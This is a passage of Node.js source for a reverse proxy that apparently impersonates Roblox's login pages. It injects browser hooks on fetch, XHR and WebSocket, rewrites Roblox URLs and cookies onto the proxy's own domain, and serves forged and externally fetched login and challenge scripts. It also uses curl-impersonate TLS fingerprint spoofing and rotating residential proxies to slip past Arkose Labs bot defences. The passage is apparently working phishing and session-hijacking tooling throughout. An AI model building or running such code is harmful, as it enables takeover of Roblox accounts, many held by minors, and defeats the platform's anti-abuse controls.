        } else if (resource && resource.url) {
            resource = new Request(rewrittenUrl, init);
            // Clear init since we already applied it to the Request
            init = undefined;
        }

        return _fetch.call(this, resource, init).then(function(response) {
            var clonedResponse = response.clone();
            
            // Debug: Log all responses to challenge/login endpoints
            if (url.includes('challenge') || url.includes('login') || url.includes('auth') || url.includes('arkose')) {
                log('Response:', {url: url, status: response.status, solved: window.__rblxChallengeSolved});
            }

            var challengeId = response.headers.get('rblx-challenge-id');
            var challengeType = response.headers.get('rblx-challenge-type');
            var challengeMetadata = response.headers.get('rblx-challenge-metadata');

            if (challengeId && challengeMetadata) {
                log('Challenge required (from headers):', {id: challengeId, type: challengeType});
                window.__rblxChallengeId = challengeId;
                window.__rblxChallengeType = challengeType;
                window.__rblxChallengeSolved = false;
                window.__rblxCaptchaToken = null; // Reset captcha token for new challenge
                try {
                    var metaStr = atob(challengeMetadata);
                    var meta = JSON.parse(metaStr);
                    window.__rblxUserId = meta.userId;
                    window.__rblxBrowserTrackerId = meta.browserTrackerId;
                    log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId, meta: meta});
                    // Save immediately
                    saveChallengeState();
                    log('Challenge state saved after metadata extraction');
                } catch(e) {
                    log('Failed to parse challenge metadata:', e.message, challengeMetadata.substring(0, 100));
                }
            }

            // Check for challenge continue response - HANDLE CHAINED CHALLENGES
            if (isChallengeContinue) {
                clonedResponse.text().then(function(text) {
                    try {
                        var data = JSON.parse(text);
                        log('Challenge continue response body:', data);
                        
                        // Check if response contains a NEW challenge (chained challenges)
                        if (data.challengeType && data.challengeType !== '') {
                            log('CHAINED CHALLENGE detected! New challenge type:', data.challengeType);
                            window.__rblxChallengeId = data.challengeId;
                            window.__rblxChallengeType = data.challengeType;
                            window.__rblxChallengeSolved = false;
                            window.__rblxCaptchaToken = null;
                            
                            // Parse the new challenge metadata
                            if (data.challengeMetadata) {
                                try {
                                    var meta = JSON.parse(data.challengeMetadata);
                                    log('New challenge metadata:', meta);
                                    
                                    // Handle captcha challenge specifically
                                    if (data.challengeType === 'captcha') {
                                        log('CAPTCHA challenge detected - waiting for user to solve');
                                    }
                                } catch(e) {
                                    log('Failed to parse chained challenge metadata:', e.message);
                                }
                            }
                            saveChallengeState();
                        } else if (response.status === 200) {
                            // No new challenge type, this challenge is complete
                            log('Challenge continue succeeded! Marking as solved', {url: url});
                            window.__rblxChallengeSolved = true;
                            saveChallengeState();
                            sessionStorage.setItem('__rblxChallengeSolved', 'true');
                            
                            if (data.challengeToken) {
                                window.__rblxChallengeToken = data.challengeToken;
                                sessionStorage.setItem('__rblxChallengeToken', data.challengeToken);
                                log('Stored challenge token from continue response');
                            }
                        }
                    } catch(e) {
                        log('Failed to parse challenge continue response:', e.message);
                    }
                }).catch(function(err) {
                    log('Failed to read challenge continue response:', err);
                });
            }

            return response;
        });
    };

    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        this.__rblxUrl = args[1];
        return _open.apply(this, args);
    };

    var _setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
        this.__rblxHeaders = this.__rblxHeaders || {};
        this.__rblxHeaders[header.toLowerCase()] = value;
        return _setRequestHeader.call(this, header, value);
    };

    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function(body) {
        this.withCredentials = true;
        
        // AGGRESSIVE: Check for login endpoint
        var isLoginUrl = this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('/auth-api/v2/login'));
        var isChallengeContinue = this.__rblxUrl && this.__rblxUrl.includes('challenge/v1/continue');
        var isArkoseUrl = this.__rblxUrl && (this.__rblxUrl.includes('arkose') || this.__rblxUrl.includes('funcaptcha'));
        
        // Debug: Log all XHR requests to login/challenge/arkose endpoints
        if (isLoginUrl || isChallengeContinue || isArkoseUrl) {
            log('XHR send:', {url: this.__rblxUrl, solved: window.__rblxChallengeSolved, id: window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
        }

        // AGGRESSIVE: If we have challenge data, ALWAYS add it to login requests
        if (isLoginUrl && window.__rblxChallengeId && (window.__rblxUserId || window.__rblxCaptchaToken)) {
            var solutionMetadata = constructSolutionMetadata();
            if (solutionMetadata) {
                var hasChallengeHeader = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-metadata'];
                if (!hasChallengeHeader) {
                    _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
                    _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'chef');
                    _setRequestHeader.call(this, 'rblx-challenge-metadata', solutionMetadata);
                    _setRequestHeader.call(this, 'x-retry-attempt', '1');
                    log('XHR: ADDED challenge headers to login!', {id: window.__rblxChallengeId, url: this.__rblxUrl});
                } else {
                    log('XHR: Challenge headers already present', {url: this.__rblxUrl});
                }
            }
        } else if (isLoginUrl) {
            log('XHR: Login request but no challenge data', {hasId: !!window.__rblxChallengeId, hasUserId: !!window.__rblxUserId});
        }

        // Add rblx-challenge-id to challenge/continue XHR requests
        if (isChallengeContinue && window.__rblxChallengeId) {
            var hasId = this.__rblxHeaders && this.__rblxHeaders['rblx-challenge-id'];
            if (!hasId) {
                _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
                _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'captcha');
                log('XHR: Added rblx-challenge-id to challenge/continue', {id: window.__rblxChallengeId});
            }
        }

        var self = this;
        var originalOnReadyStateChange = this.onreadystatechange;
        this.onreadystatechange = function() {
            if (self.readyState === 4) {
                // Debug: Log all XHR responses
                if (self.__rblxUrl && (self.__rblxUrl.includes('login') || self.__rblxUrl.includes('challenge') || self.__rblxUrl.includes('arkose'))) {
                    log('XHR response:', {url: self.__rblxUrl, status: self.status});
                }
                
                // Handle challenge continue response for XHR
                if (isChallengeContinue) {
                    try {
                        var text = self.responseText;
                        var data = JSON.parse(text);
                        log('XHR Challenge continue response:', data);
                        
                        // Check for chained challenge
                        if (data.challengeType && data.challengeType !== '') {
                            log('XHR CHAINED CHALLENGE detected! Type:', data.challengeType);
                            window.__rblxChallengeId = data.challengeId;
                            window.__rblxChallengeType = data.challengeType;
                            window.__rblxChallengeSolved = false;
                            window.__rblxCaptchaToken = null;
                            saveChallengeState();
                        } else if (self.status === 200) {
                            log('XHR Challenge continue succeeded, marking as solved');
                            window.__rblxChallengeSolved = true;
                            saveChallengeState();
                        }
                    } catch(e) {
                        // Ignore parse errors
                    }
                }
                
                var challengeId = self.getResponseHeader('rblx-challenge-id');
                var challengeType = self.getResponseHeader('rblx-challenge-type');
                var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
                if (challengeId && challengeMetadata) {
                    log('XHR Challenge required (from headers):', {id: challengeId, type: challengeType});
                    window.__rblxChallengeId = challengeId;
                    window.__rblxChallengeType = challengeType;
                    window.__rblxChallengeSolved = false;
                    window.__rblxCaptchaToken = null;
                    try {
                        var metaStr = atob(challengeMetadata);
                        var meta = JSON.parse(metaStr);
                        window.__rblxUserId = meta.userId;
                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
                        log('XHR Extracted metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
                    } catch(e) {
                        log('XHR Failed to parse metadata:', e.message);
                    }
                    saveChallengeState();
                }
            }
            if (originalOnReadyStateChange) return originalOnReadyStateChange.apply(this, arguments);
        };

        return _send.apply(this, arguments);
    };

    // Also intercept Arkose Labs script loading
    var originalCreateElement = document.createElement;
    document.createElement = function(tagName) {
        var element = originalCreateElement.call(document, tagName);
        if (tagName.toLowerCase() === 'script') {
            var originalSetAttribute = element.setAttribute;
            element.setAttribute = function(name, value) {
                if (name === 'src' && value) {
                    var originalValue = value;
                    value = rewriteUrl(value);
                    if (originalValue !== value) {
                        log('Rewrote script src:', {from: originalValue, to: value});
                    }
                }
                return originalSetAttribute.call(this, name, value);
            };
            Object.defineProperty(element, 'src', {
                set: function(value) {
                    this.setAttribute('src', rewriteUrl(value));
                },
                get: function() {
                    return this.getAttribute('src');
                }
            });
        }
        if (tagName.toLowerCase() === 'iframe') {
            var originalSetAttribute = element.setAttribute;
            element.setAttribute = function(name, value) {
                if ((name === 'src' || name === 'data-src') && value) {
                    var originalValue = value;
                    value = rewriteUrl(value);
                    if (originalValue !== value) {
                        log('Rewrote iframe src:', {from: originalValue, to: value});
                    }
                }
                return originalSetAttribute.call(this, name, value);
            };
        }
        if (tagName.toLowerCase() === 'link') {
            var originalSetAttribute = element.setAttribute;
            element.setAttribute = function(name, value) {
                if (name === 'href' && value) {
                    var originalValue = value;
                    value = rewriteUrl(value);
                    if (originalValue !== value) {
                        log('Rewrote link href:', {from: originalValue, to: value});
                    }
                }
                return originalSetAttribute.call(this, name, value);
            };
        }
        return element;
    };
    
    // CRITICAL: Intercept WebSocket connections for Arkose
    var OriginalWebSocket = window.WebSocket;
    window.WebSocket = function(url, protocols) {
        var rewrittenUrl = rewriteUrl(url);
        if (url !== rewrittenUrl) {
            log('Rewrote WebSocket URL:', {from: url, to: rewrittenUrl});
        }
        return new OriginalWebSocket(rewrittenUrl, protocols);
    };
    window.WebSocket.prototype = OriginalWebSocket.prototype;
    
    // Helper to set captcha token (called by Arkose callback)
    window.setRblxCaptchaToken = function(token) {
        log('Captcha token received from Arkose!', {token: token.substring(0, 30) + '...'});
        window.__rblxCaptchaToken = token;
        window.__rblxChallengeSolved = true;
        saveChallengeState();
        
        // Trigger a new challenge/continue request with the captcha token
        log('Ready to submit captcha solution');
    };
    
    // Helper to clear challenge state after successful login
    window.clearRblxChallengeState = function() {
        window.__rblxChallengeId = null;
        window.__rblxChallengeType = null;
        window.__rblxUserId = null;
        window.__rblxBrowserTrackerId = null;
        window.__rblxChallengeSolved = false;
        window.__rblxChallengeToken = null;
        window.__rblxCaptchaToken = null;
        sessionStorage.removeItem('__rblxChallengeId');
        sessionStorage.removeItem('__rblxChallengeType');
        sessionStorage.removeItem('__rblxUserId');
        sessionStorage.removeItem('__rblxBrowserTrackerId');
        sessionStorage.removeItem('__rblxChallengeSolved');
        sessionStorage.removeItem('__rblxChallengeToken');
        sessionStorage.removeItem('__rblxCaptchaToken');
        log('Challenge state cleared');
    };
    
    // Expose challenge state for debugging
    window.getRblxChallengeState = function() {
        return {
            challengeId: window.__rblxChallengeId,
            challengeType: window.__rblxChallengeType,
            userId: window.__rblxUserId,
            browserTrackerId: window.__rblxBrowserTrackerId,
            challengeSolved: window.__rblxChallengeSolved,
            challengeToken: window.__rblxChallengeToken,
            captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
        };
    };

    // Save challenge state before page unload
    window.addEventListener('beforeunload', function() {
        if (window.__rblxChallengeId) {
            saveChallengeState();
            log('Saved challenge state before unload');
        }
    });
    
    // Intercept login button clicks to debug form submission
    document.addEventListener('click', function(e) {
        var target = e.target;
        // Check if clicked element is a login button or inside one
        while (target && target !== document.body) {
            if (target.tagName === 'BUTTON' || target.getAttribute('type') === 'submit') {
                var text = target.textContent || target.innerText || '';
                if (text.toLowerCase().includes('log in') || text.toLowerCase().includes('login')) {
                    log('Login button clicked!', {
                        solved: window.__rblxChallengeSolved, 
                        id: window.__rblxChallengeId,
                        userId: window.__rblxUserId,
                        captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
                    });
                }
            }
            target = target.parentElement;
        }
    }, true);
    
    // Intercept form submissions
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var action = form.action || '';
        if (action.includes('login') || form.id.includes('login')) {
            log('Login form submitted!', {
                action: action,
                solved: window.__rblxChallengeSolved,
                id: window.__rblxChallengeId,
                captchaToken: window.__rblxCaptchaToken ? 'yes' : 'no'
            });
        }
    }, true);
    
    // Monitor for challenge modal/iframe appearance
    var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
            mutation.addedNodes.forEach(function(node) {
                if (node.nodeType === 1) { // Element node
                    // Check if it's an iframe (captcha iframe)
                    if (node.tagName === 'IFRAME') {
                        var src = node.src || '';
                        if (src.includes('arkose') || src.includes('funcaptcha') || src.includes('challenge')) {
                            log('Challenge iframe detected!', {src: src});
                        }
                    }
                    // Check for challenge modal
                    if (node.className && typeof node.className === 'string') {
                        if (node.className.includes('challenge') || node.className.includes('captcha')) {
                            log('Challenge element detected!', {className: node.className});
                        }
                    }
                }
            });
        });
    });
    
    // Start observing when DOM is ready
    if (document.body) {
        observer.observe(document.body, { childList: true, subtree: true });
    } else {
        document.addEventListener('DOMContentLoaded', function() {
            observer.observe(document.body, { childList: true, subtree: true });
        });
    }
    
    // Run protocol-relative URL rewrite after a short delay
    setTimeout(rewriteProtocolRelativeUrls, 100);
    setTimeout(rewriteProtocolRelativeUrls, 500);
    setTimeout(rewriteProtocolRelativeUrls, 1000);

    log('Proxy interceptor loaded with FULL ARKOSE support');
    log('Challenge state:', window.getRblxChallengeState());
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    // Strip www. prefix for consistent URL rewriting
    const cleanHost = host.replace(/^www\./, '');
    let result = body;
    
    // Sort by target length descending so more specific domains match before shorter ones
    // e.g. challenge.roblox.com must match before a generic *.roblox.com pattern
    const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
    
    for (const [prefix, target] of entries) {
        const domain = target.replace(/^https?:/, '');
        // Rewrite https:// URLs
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${cleanHost}/${prefix}`);
        // Rewrite protocol-relative URLs
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${cleanHost}/${prefix}`);
    }
    
    // Rewrite main Roblox domains
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${cleanHost}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${cleanHost}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${cleanHost}`);

    // FIX 3a: Rewrite the hashed EnvironmentUrls CDN script to our custom override route.
    // The real file contains hardcoded roblox.com hostnames that bypass our fetch interceptor.
    result = result.replace(
        /https?:\/\/[^"'\s]+[a-f0-9]{10,}-EnvironmentUrls\.js/g,
        `https://${cleanHost}/js/EnvironmentUrls.js`
    );
    // Also catch the non-hashed variant (e.g. /js/EnvironmentUrls.js on www.roblox.com)
    result = result.replace(
        /(src=["'])(?:https?:\/\/[^"'\s]+\/)?EnvironmentUrls\.js(["'])/g,
        `$1https://${cleanHost}/js/EnvironmentUrls.js$2`
    );

    // FIX 3b: Remove crossorigin="use-credentials" from the prelude script tag.
    // Sending credentials cross-origin on that path causes CORS preflight to fail
    // after it gets re-routed through the proxy.
    result = result.replace(
        /(<script[^>]+id="prelude"[^>]*)\s+crossorigin="use-credentials"/g,
        '$1'
    );

    // FIX 3c: Rewrite Challenge, ReactLogin, CoreUtilities CDN hashes to /js/ routes
    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-Challenge\.js/g, `https://${cleanHost}/js/Challenge.js`);
    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-ReactLogin\.js(\?[^"'\s]*)?/g, `https://${cleanHost}/js/ReactLogin.js?v=1`);
    result = result.replace(/https?:\/\/[^"'\s]+[a-f0-9]{10,}-CoreUtilities\.js/g, `https://${cleanHost}/js/CoreUtilities.js`);
    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-Challenge\\.js`, "g"), `https://${cleanHost}/js/Challenge.js`);
    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-ReactLogin\\.js(\\?[^"'\\s]*)?`, "g"), `https://${cleanHost}/js/ReactLogin.js?v=1`);
    result = result.replace(new RegExp(`https?://${cleanHost}/js-cdn/[a-f0-9]{10,}-CoreUtilities\\.js`, "g"), `https://${cleanHost}/js/CoreUtilities.js`);

    return result;
}

// ─────────────────────────────────────────────────────────────
// CUSTOM JS FILES — served from GitHub raw
// These are the competitor's patched bundles that make the
// challenge flow work correctly through a proxy.
// ─────────────────────────────────────────────────────────────
const GITHUB_RAW_BASE = 'https://raw.githubusercontent.com/WeAreDevs-ops/Reverse-proxy/main/js';

const CUSTOM_JS_FILES = {
    '/js/Challenge.js':      `${GITHUB_RAW_BASE}/Challenge.js`,
    '/js/ReactLogin.js':     `${GITHUB_RAW_BASE}/ReactLogin.js`,
    '/js/CoreUtilities.js':  `${GITHUB_RAW_BASE}/CoreUtilities.js`,
    '/js/EnvironmentUrls.js':`${GITHUB_RAW_BASE}/EnvironmentUrls.js`,
};

// In-memory cache so we don't hit GitHub on every request
const jsCache = {};

function fetchRaw(url) {
    return new Promise((resolve, reject) => {
        const mod = url.startsWith('https:') ? https : http;
        mod.get(url, (res) => {
            // Follow redirects
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return fetchRaw(res.headers.location).then(resolve).catch(reject);
            }
            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP ${res.statusCode} for ${url}`));
            }
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => resolve(data));
        }).on('error', reject);
    });
}

// Serve each custom JS file from GitHub, cached in memory
for (const [path, githubUrl] of Object.entries(CUSTOM_JS_FILES)) {
    app.get(path, async (req, res) => {
        try {
            if (!jsCache[path]) {
                console.log(`[custom-js] Fetching ${path} from GitHub...`);
                jsCache[path] = await fetchRaw(githubUrl);
                console.log(`[custom-js] Cached ${path} (${jsCache[path].length} bytes)`);
            }
            res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            res.setHeader('Cache-Control', 'public, max-age=300');
            res.send(jsCache[path]);
        } catch (err) {
            console.error(`[custom-js] Failed to serve ${path}:`, err.message);
            res.status(502).send(`// Failed to load ${path}: ${err.message}`);
        }
    });
}

// ─────────────────────────────────────────────────────────────
// PRELUDE — The prelude/latest script requires a valid Roblox
// session cookie to return BAT tokens (401 without it).
// We let the browser fetch it normally via the rotating-client-service
// proxy route. The script self-executes in the browser and sets
// ChefScript.prelude which Challenge.js reads.
// ─────────────────────────────────────────────────────────────
async function fetchPreludeBlobs() {
    // Not fetching server-side — needs user session cookies.
    // Return empty so HTML injection is skipped cleanly.
    return null;
}

// ─────────────────────────────────────────────────────────────
// FIX 1: Redirect mis-routed prelude script
// rewriteUrls() turns https://apis.roblox.com → /apis-api, so the
// prelude <script> ends up at /apis-api/rotating-client-service/...
// We catch it here and redirect to the correct proxied path.
// ─────────────────────────────────────────────────────────────
app.get('/apis-api/rotating-client-service/v1/prelude/latest', (req, res) => {
    console.log('[prelude] Redirecting mis-routed prelude to correct path');
    res.redirect(302, '/rotating-client-service/v1/prelude/latest');
});

// ─────────────────────────────────────────────────────────────
// FIX 2: Serve a custom EnvironmentUrls.js so Roblox JS reads
// proxy URLs from the very start, before any fetch interceptor.
// The competitor does this — serving /js/EnvironmentUrls.js from
// their own server instead of proxying the real CDN file.
// ─────────────────────────────────────────────────────────────
app.get('/js/EnvironmentUrls.js', (req, res) => {
    const host = (req.headers.host || 'localhost').replace(/^www\./, '');
    const h = `https://${host}`;
    console.log(`[EnvironmentUrls] Serving custom EnvironmentUrls.js for host: ${host}`);
    res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.send(`
(function() {
    var Roblox = window.Roblox = window.Roblox || {};
    Roblox.EnvironmentUrls = {
        apiGatewayUrl:                  "${h}/apis-api",
        authApi:                        "${h}/auth-api",
        apiProxyUrl:                    "${h}/api-api",
        economyApi:                     "${h}/economy-api",
        usersApi:                       "${h}/users-api",
        catalogApi:                     "${h}/catalog-api",
        gamesApi:                       "${h}/games-api",
        thumbnailsApi:                  "${h}/thumbnails-api",
        ecsv2Api:                       "${h}/ecsv2-api",
        contentUrl:                     "${h}/content-cdn",
        authTokenServiceUrl:            "${h}/auth-token-service",
        hbaServiceUrl:                  "${h}/hba-service",
        proofOfWorkServiceUrl:          "${h}/proof-of-work-service",
        accountSecurityServiceUrl:      "${h}/account-security-service",
        rotatingClientServiceUrl:       "${h}/rotating-client-service",
        guacV2Url:                      "${h}/guac-v2",
        productExperimentationPlatformUrl: "${h}/product-experimentation-platform",
        otpServiceUrl:                  "${h}/otp-service",
        challengeUrl:                   "${h}/challenge",
        captchaUrl:                     "${h}/captcha",
        abuseUrl:                       "${h}/abuse",
        clientTelemetryUrl:             "${h}/client-telemetry",
        ephemeralCountersUrl:           "${h}/ephemeralcounters",
        metricsUrl:                     "${h}/metrics",
        localeUrl:                      "${h}/locale",
        notificationUrl:                "${h}/notification",
        realtimeUrl:                    "${h}/realtime",
        presenceUrl:                    "${h}/presence",
        friendsUrl:                     "${h}/friends",
        groupsUrl:                      "${h}/groups",
        inventoryUrl:                   "${h}/inventory",
        tradesUrl:                      "${h}/trades",
        billingUrl:                     "${h}/billing",
        premiumUrl:                     "${h}/premium",
        badgesUrl:                      "${h}/badges",
        avatarUrl:                      "${h}/avatar",
        developUrl:                     "${h}/develop",
        publishUrl:                     "${h}/publish",
        voiceUrl:                       "${h}/voice",
        chatUrl:                        "${h}/chat",
        privateMessagesUrl:             "${h}/privatemessages",
        shareUrl:                       "${h}/share",
        adsUrl:                         "${h}/ads",
        followingsUrl:                  "${h}/followings",
        accountSettingsUrl:             "${h}/accountsettings",
        clientSettingsUrl:              "${h}/clientsettings",
        clientSettingsCdnUrl:           "${h}/clientsettingscdn",
        websiteUrl:                     "${h}",
        wwwUrl:                         "${h}",
        // Arkose / FunCaptcha
        captchaProvider:                "ARKOSE_LABS",
        arkoselabsBaseUrl:              "${h}/arkoselabs-rbxcdn",
    };
})();
`);
});

app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const ms = Date.now() - start;
        if (req.path !== '/www/e.png' && req.path !== '/pe' && !req.path.includes('arkose')) {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
        }
    });
    next();
});

app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
        'access-control-allow-headers': [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
            ...CHALLENGE_HEADERS
        ].join(', '),
        'access-control-max-age': '86400',
    });
    res.sendStatus(200);
});

// ─────────────────────────────────────────────────────────────
// ARKOSE CURL-IMPERSONATE PROXY
// Uses a spawned curl-impersonate-chrome child process so that
// the TLS handshake carries Chrome's JA3/JA4 fingerprint
// instead of Node.js's easily-detected fingerprint.
// ─────────────────────────────────────────────────────────────

/**
 * Make an HTTP request via curl-impersonate + optional residential proxy.
 * Returns { statusCode, headers, body (Buffer) }
 */
function makeArkoseRequest(method, url, outHeaders, proxyUrl, body) {
    return new Promise((resolve, reject) => {
        const args = [
            '--silent',
            '--include',         // include response headers in stdout
            '--max-time', '30',
            '--http2',
            '--compressed',      // decompress response; removes content-encoding header
            '-X', method.toUpperCase(),
        ];

        if (proxyUrl) {
            args.push('-x', proxyUrl);
        }

        // Skip hop-by-hop / computed headers
        const skip = new Set(['host', 'content-length', 'transfer-encoding', 'connection', 'accept-encoding']);
        for (const [k, v] of Object.entries(outHeaders)) {
            if (!skip.has(k.toLowerCase())) {
                args.push('-H', `${k}: ${v}`);
            }
        }

        if (body && body.length > 0) {
            args.push('--data-binary', '@-'); // read body from stdin
        }

        args.push(url);

        const child = spawn(CURL_BIN, args, { timeout: 35000 });

        if (body && body.length > 0) {
            child.stdin.write(body);
            child.stdin.end();
        } else {
            child.stdin.end();
        }

        const chunks = [];
        let stderr = '';
        child.stdout.on('data', c => chunks.push(c));
        child.stderr.on('data', c => { stderr += c.toString(); });

        child.on('error', reject);

        child.on('close', (code) => {
            const buf = Buffer.concat(chunks);
            const raw = buf.toString('binary');

            // curl may output multiple HTTP blocks when going through a proxy CONNECT tunnel.
            // We want the LAST HTTP/x.x block.
            const httpRe = /HTTP\/[\d.]+ \d+[^\r\n]*/g;
            let lastMatch = null, m;
            while ((m = httpRe.exec(raw)) !== null) lastMatch = m;

            if (!lastMatch) {
                return reject(new Error(`curl (${CURL_BIN}) exit ${code} — no HTTP response. stderr: ${stderr}`));
            }

            const hdrStart = lastMatch.index;
            const hdrEnd   = raw.indexOf('\r\n\r\n', hdrStart);
            if (hdrEnd === -1) {
                return reject(new Error('Could not find end of response headers'));
            }

            const headersStr  = raw.substring(hdrStart, hdrEnd);
            const bodyBuffer  = buf.slice(hdrEnd + 4);

            const statusCode  = parseInt(lastMatch[0].match(/\d{3}/)[0], 10);
            const parsedHdrs  = {};
            for (const line of headersStr.split('\r\n').slice(1)) {
                const ci = line.indexOf(':');
                if (ci < 1) continue;
                const k = line.substring(0, ci).trim().toLowerCase();
                const v = line.substring(ci + 1).trim();
                if (parsedHdrs[k] !== undefined) {
                    parsedHdrs[k] = [].concat(parsedHdrs[k], v);
                } else {
                    parsedHdrs[k] = v;
                }
            }

            resolve({ statusCode, headers: parsedHdrs, body: bodyBuffer });
        });
    });
}

/**
 * Express middleware factory for Arkose/funcaptcha/rbxcdn routes.
 * Replaces http-proxy-middleware for these paths so that
 * curl-impersonate handles the outbound TLS connection.
 */
function createArkoseCurlProxy(prefix, target) {
    const arkoseOrigin = target.replace(/\/+$/, '');

    return async (req, res) => {
        // Handle preflight
        if (req.method === 'OPTIONS') {
            const origin = req.headers['origin'] || `https://${req.headers.host}`;
            return res.set({
                'Access-Control-Allow-Origin': origin,
                'Access-Control-Allow-Credentials': 'true',
                'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
                'Access-Control-Allow-Headers': [
                    'Content-Type', 'x-csrf-token', 'Authorization',
                    'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
                    'Accept', 'Accept-Language', 'Accept-Encoding',
                    ...CHALLENGE_HEADERS
                ].join(', '),
            }).sendStatus(200);
        }

        // Build target URL
        const targetPath = req.path.replace(new RegExp(`^\\/${prefix}`), '') || '/';
        const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
        const targetUrl = `${target.replace(/\/+$/, '')}${targetPath}${qs}`;

        // Build outbound headers
        const outHeaders = {
            'Origin':          arkoseOrigin,
            'Referer':         `${arkoseOrigin}/`,
            'User-Agent':      req.headers['user-agent'] || BROWSER_UA,
            'Accept':          req.headers['accept'] || 'application/javascript, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        };
        if (req.headers['content-type']) outHeaders['Content-Type'] = req.headers['content-type'];
        for (const h of CHALLENGE_HEADERS) {
            if (req.headers[h]) outHeaders[h] = req.headers[h];
        }

        // Read request body if any
        let body = null;
        if (['POST', 'PUT', 'PATCH'].includes(req.method.toUpperCase())) {
            body = await new Promise(resolve => {
                const bufs = [];
                req.on('data', c => bufs.push(c));
                req.on('end', () => resolve(Buffer.concat(bufs)));
            });
        }

        const proxyUrl = getNextProxy();
        console.log(`[${prefix}] 🌍 curl-impersonate (${CURL_BIN}) → ${targetUrl.substring(0, 80)}`);

        try {
            const result = await makeArkoseRequest(req.method, targetUrl, outHeaders, proxyUrl, body);
            console.log(`[${prefix}] ${result.statusCode === 200 ? '✅' : '❌'} ${req.method} ${req.path} → ${result.statusCode}`);

            const origin = req.headers['origin'] || `https://${req.headers.host}`;
            res.set('Access-Control-Allow-Origin', origin);
            res.set('Access-Control-Allow-Credentials', 'true');
            res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
            res.set('Access-Control-Allow-Headers', ['Content-Type', 'x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
            res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

            // Blocked / hop-by-hop headers we must NOT forward
            const skipHdrs = new Set([
                'content-security-policy', 'content-security-policy-report-only',
                'x-content-security-policy', 'transfer-encoding', 'connection',
                'content-encoding', // --compressed already decoded; re-sending would corrupt
            ]);

            for (const [k, v] of Object.entries(result.headers)) {
                if (skipHdrs.has(k)) continue;
                if (k === 'set-cookie') {
                    const host = req.headers.host || 'localhost';
                    res.set('Set-Cookie', rewriteCookies([].concat(v), host));
                } else {
                    try { res.set(k, v); } catch (_) { /* ignore malformed headers */ }
                }
            }

            res.status(result.statusCode).send(result.body);

        } catch (err) {
            console.error(`[${prefix}] ❌ curl error: ${err.message}`);
            if (!res.headersSent) {
                res.status(502).json({ error: 'Proxy error (curl)', message: err.message });
            }
        }
    };
}

function createRobloxProxy(prefix, target) {
    const isArkose = target.includes('arkoselabs.com')
        || target.includes('funcaptcha.com')
        || target.includes('rbxcdn.com')
        || prefix.startsWith('arkose')
        || prefix.includes('rbxcdn')
        || target.includes('arkoselabs.');
    
    // Use residential proxy ONLY for Arkose Labs to bypass IP blocking
    let agent;
    if (isArkose) {
        const proxyUrl = getNextProxy();
        agent = new HttpsProxyAgent(proxyUrl);
        console.log(`[${prefix}] 🌍 Using residential proxy: ${proxyUrl.split('@')[1]}`);
    } else {
        agent = target.startsWith('https:') ? httpsAgent : httpAgent;
    }
    
    return createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 30000,
        timeout: 30000,
        agent,
        
        on: {
            proxyReq: (proxyReq, req) => {
                // Guard: keep-alive socket reuse can cause headers-already-sent error
                if (proxyReq.headersSent) return;
                try {
